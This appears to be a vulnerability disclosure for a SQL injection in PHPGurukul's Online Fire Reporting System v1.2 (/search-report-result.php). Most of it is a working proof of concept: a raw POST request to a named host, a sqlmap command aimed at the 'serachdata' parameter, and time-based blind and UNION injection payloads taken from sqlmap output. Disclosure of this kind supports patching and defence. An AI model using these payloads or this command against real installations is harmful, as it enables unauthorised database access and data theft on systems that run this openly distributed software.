# SQLi vulnerability in Online Fire Reporting System v1.2 of file /search-report-result.php

**vender**:

- [PHPGurukul](https://vuldb.com/?vendor.phpgurukul)
- Online Fire Reporting System

**SoftLink**:

- [Online Fire Reporting System Project in PHP- PHPGurukul](https://phpgurukul.com/online-fire-reporting-system-using-php-and-mysql/)

**Vulnerable File**

- /search-report-result.php

**Version**

- V1.2

### POC

```http
POST /search-report-result.php HTTP/1.1
Host: www.firereport.top
Cookie: PHPSESSID=vhqmp6o0p6p8lf7sscpqhrp6tf
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Priority: u=0, i
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0

serachdata=test
```



```bash
sqlmap -u http://localhost/search-report-result.php --data="serachdata=test" -p serachdata --batch
```





```
---
Parameter: serachdata (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: serachdata=test' AND (SELECT 1379 FROM (SELECT(SLEEP(5)))dsAx)-- nnah

    Type: UNION query
    Title: Generic UNION query (NULL) - 10 columns
    Payload: serachdata=test' UNION ALL SELECT NULL,NULL,CONCAT(0x716a6b6271,0x457447454e615370536e4d76764557546f4a5a5370505762507474724a706d54446a4375714c4157,0x716a627171),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
---
```

![image-20250531182118604](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505311821955.png)